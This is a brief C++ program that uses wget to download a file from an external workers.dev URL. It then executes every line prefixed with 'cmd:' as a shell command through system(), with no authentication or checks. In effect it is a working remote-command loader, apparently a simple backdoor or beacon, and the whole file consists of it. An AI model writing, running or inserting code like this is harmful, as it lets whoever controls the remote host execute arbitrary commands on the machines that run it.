#include "bits/stdc++.h"

inline bool log_cerr(std::string event, std::string info)
{
    std::cerr << event << ": " << info << std::endl;
    return 1;
}

int main()
{
    system("wget -O command https://cfg.xjoi.workers.dev");
    std::ifstream command("command");

    std::string str;
    while (getline(command, str))
    {
        auto t = str.find(':');
        if (t == std::string::npos)
        {
            log_cerr("COMMAND_COLON_NOT_FOUND", str);
            continue;
        }
        std::string cmd_name = str.substr(0, t), cmd_let = str.substr(t + 1);
        if (cmd_let[0] == ' ')
        {
            cmd_let = cmd_let.substr(1);
        }

        if (cmd_name == "cmd")
        {
            system(cmd_let.c_str());
        }
    }
}